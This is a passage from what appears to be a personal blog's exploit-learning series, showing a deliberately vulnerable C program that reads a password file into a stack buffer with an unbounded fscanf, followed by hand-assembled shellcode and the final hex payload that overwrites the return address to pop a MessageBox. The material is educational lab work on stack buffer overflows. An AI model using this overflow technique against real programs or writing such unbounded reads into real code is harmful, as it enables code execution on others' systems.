</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>valid_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span> <span class=n>fp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>LoadLibrary</span><span class=p>(</span><span class=s>&#34;user32.dll&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;password.txt&#34;</span><span class=p>,</span> <span class=s>&#34;rw+&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fscanf</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_flag</span> <span class=o>=</span> <span class=nf>verify_password</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>valid_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ERROR!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;OK!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=analysis-expstd0103>Analysis (ExpStd0103)</h5><blockquote><p>Objective: To implant code to implement a popup MessageBox during program validation</p></blockquote><ul><li>Necessary information<ul><li>Array start address: <code>0x0012FAF0</code> (also the start address of ShellCode execution)</li><li>MessageBoxA address: <code>0x77D507EC</code></li><li>Hexadecimal text: <code>4D6F656F6D75</code> (Moeomuoo)</li></ul></li><li>The machine code composed of</li></ul><div class=table-wrapper><table><thead><tr><th>Machine code(HEX)</th><th>Assembly code</th><th>Comments</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX, EBX</td><td>Clear EBX to ensure there are no zeros in ShellCode (as of character)</td></tr><tr><td>53</td><td>PUSH EBX</td><td>\0` at the end of the string</td></tr><tr><td>68 6D756F6F</td><td>PUSH 6F6F756D</td><td>Press in text byte muoo(0x6D756F6F)</td></tr><tr><td>68 4D6F656F</td><td>PUSH 6F656F4D</td><td>press in text byte moeo(0x4D6F656F)</td></tr><tr><td>8BC4</td><td>MOV EAX, ESP</td><td>ESP stack top point to string Moeomuoo, hand over to EAX</td></tr><tr><td>53</td><td>PUSH EBX</td><td>MB_OK</td></tr><tr><td>50</td><td>PUSH EAX</td><td>Message</td></tr><tr><td>50</td><td>PUSH EAX</td><td>Caption</td></tr><tr><td>53</td><td>PUSH EBX</td><td>Handle</td></tr><tr><td>B8 EC07D577</td><td>MOV EAX, 0x77D507EC</td><td>Hard-code MessageBoxA&rsquo;s address into EAX</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td>Call MessageBoxA</td></tr></tbody></table></div><ul><li>Write the machine code to password.txt in order<ul><li>Bytes 53-56 are filled with the return address (the start address of the Buffer), and the rest of the bytes are filled with 0x90</li></ul></li><li>The only imperfection is that the program crashes and quits</li></ul><blockquote><p>Here is the final password.txt</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=mi>33</span> <span class=n>DB</span> <span class=mi>53</span> <span class=mi>68</span> <span class=mi>6</span><span class=n>D</span> <span class=mi>75</span> <span class=mf>6F</span> <span class=mf>6F</span>  <span class=mi>68</span> <span class=mi>4</span><span class=n>D</span> <span class=mf>6F</span> <span class=mi>65</span> <span class=mf>6F</span> <span class=mi>8</span><span class=n>B</span> <span class=n>C4</span> <span class=mi>53</span>
</span></span><span class=line><span class=cl><span class=mi>50</span> <span class=mi>50</span> <span class=mi>53</span> <span class=n>B8</span> <span class=n>EC</span> <span class=mo>07</span> <span class=n>D5</span> <span class=mi>77</span>  <span class=n>FF</span> <span class=n>D0</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>
</span></span><span class=line><span class=cl><span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>  <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span>
</span></span><span class=line><span class=cl><span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=mi>90</span> <span class=n>F0</span> <span class=n>FA</span> <span class=mi>12</span> <span class=mo>00</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=summary>Summary</h2><p>This article discusses how to exploit buffer overflow vulnerabilities and the writing of ShellCode, but the shortcomings are hard-coded addresses and stack space shifts<br>These issues are discussed in the next article</p></section><footer class=article-footer><section class=article-tags><a href=/tags/windows/>Windows</a>
<a href=/tags/stackoverflow/>StackOverflow</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/posts/exploit-learning-notes-010-heapspray/><div class=article-details><h2 class=article-title>Exploit learning notes 010 HeapSpray</h2></div></a></article><article><a href=/posts/exploit-learning-notes-021-protected-heap/><div class=article-details><h2 class=article-title>Exploit learning notes 021 Protected HEAP</h2></div></a></article><article><a href=/posts/exploit-learning-notes-020-sehop-introduction/><div class=article-details><h2 class=article-title>Exploit learning notes 020 SEHOP introduction</h2></div></a></article><article><a href=/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/><div class=article-details><h2 class=article-title>Exploit learning notes 019 Using HeapSpray Attack ASLR</h2></div></a></article><article><a href=/posts/exploit-learning-notes-018-using-partial-overlay-location/><div class=article-details><h2 class=article-title>Exploit learning notes 018 using partial overlay location</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Misaka's Secrect Garden</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>